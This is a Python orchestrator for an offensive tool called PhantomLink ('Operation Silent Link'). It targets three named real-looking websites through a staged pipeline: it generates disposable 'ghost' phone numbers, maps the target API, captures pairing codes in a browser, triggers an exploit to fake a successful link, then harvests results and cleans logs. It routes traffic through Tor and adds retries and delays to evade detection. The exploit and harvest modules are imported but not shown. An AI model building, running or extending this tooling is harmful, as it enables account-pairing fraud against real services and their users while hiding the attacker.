"""PhantomLink Core Orchestrator — Operation Silent Link v3"""
import asyncio
import sys
import json
import hashlib
import time
from datetime import datetime

from phantom.number_gen import generate_ghost_number
from phantom.recon import map_target
from phantom.engager import capture_pairing_code, ensure_chromium
from phantom.exploit import trigger_link_success
from phantom.intel_sink import harvest_and_clean
from phantom.proxy import ensure_tor

TARGETS = {
    "zapero": "https://afrivexa.com/home?invite_code=4750",
    "waegy": "https://a1.waegy.com",
    "wha7": "https://wha7.org",
}

MAX_RETRIES = 3
RETRY_DELAY = 5

async def run_cycle(target_key: str, cycle: int = 1) -> dict:
    """Execute one PhantomLink cycle with retry logic."""
    target_url = TARGETS.get(target_key, TARGETS["zapero"])
    op_id = hashlib.sha256(f"{target_key}{datetime.utcnow().isoformat()}{cycle}".encode()).hexdigest()[:8]
    
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            print(f"\n[PhantomLink:{op_id}] Cycle {cycle} | Attempt {attempt}/{MAX_RETRIES}")
            
            # Phase 1: Generate ghost number
            ghost_number, country = generate_ghost_number()
            print(f"[{op_id}] Ghost: {ghost_number} ({country})")
            
            # Phase 2: Recon
            api_map = map_target(target_url)
            print(f"[{op_id}] Recon: {api_map.get('confirm_url', 'N/A')}")
            
            # Phase 3: Engage
            pairing_code = await capture_pairing_code(target_url, ghost_number)
            print(f"[{op_id}] Code: {pairing_code}")
            
            # Phase 4: Exploit
            result = await trigger_link_success(api_map, pairing_code, ghost_number)
            print(f"[{op_id}] Vector: {result.get('vector_used')} | Status: {result.get('status')}")
            
            # Phase 5: Harvest
            log_path = harvest_and_clean(ghost_number, result, op_id, target_key)
            
            return {
                "op_id": op_id,
                "target": target_key,
                "ghost_number": ghost_number,
                "country": country,
                "pairing_code": pairing_code,
                "vector": result.get("vector_used"),
                "status": result.get("status"),
                "log": log_path,
            }
        except Exception as e:
            print(f"[{op_id}] Attempt {attempt} failed: {e}")
            if attempt < MAX_RETRIES:
                print(f"[{op_id}] Retrying in {RETRY_DELAY}s...")
                await asyncio.sleep(RETRY_DELAY)
    
    return {"op_id": op_id, "status": "failed_all_retries"}

async def main(target_key: str, cycles: int = 1):
    """Run PhantomLink operation."""
    print("=" * 50)
    print(f"  PhantomLink — Operation Silent Link")
    print(f"  Target: {target_key} | Cycles: {cycles}")
    print("=" * 50)
    
    # Pre-flight checks
    print("\n[Pre-flight] Starting Tor...")
    ensure_tor()
    
    print("[Pre-flight] Starting Chromium...")
    ensure_chromium()
    
    results = []
    for i in range(1, cycles + 1):
        result = await run_cycle(target_key, i)
        results.append(result)
        if i < cycles:
            delay = 10 + (i * 5)  # Increasing delay between cycles
            print(f"\n[PhantomLink] Waiting {delay}s before next cycle...")
            await asyncio.sleep(delay)
    
    # Summary
    print("\n" + "=" * 50)
    print("  MISSION SUMMARY")
    print("=" * 50)
    for r in results:
        print(f"  {r['op_id']}: {r.get('status')} | Vector: {r.get('vector')} | {r.get('ghost_number')}")
    
    return results

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="PhantomLink — Silent Link Operation")
    parser.add_argument("--target", "-t", default="zapero", choices=list(TARGETS.keys()))
    parser.add_argument("--cycles", "-n", type=int, default=1)
    parser.add_argument("--check", action="store_true", help="Validate environment only")
    args = parser.parse_args()
    
    if args.check:
        from phantom.setup import validate
        validate()
    else:
        asyncio.run(main(args.target, args.cycles))
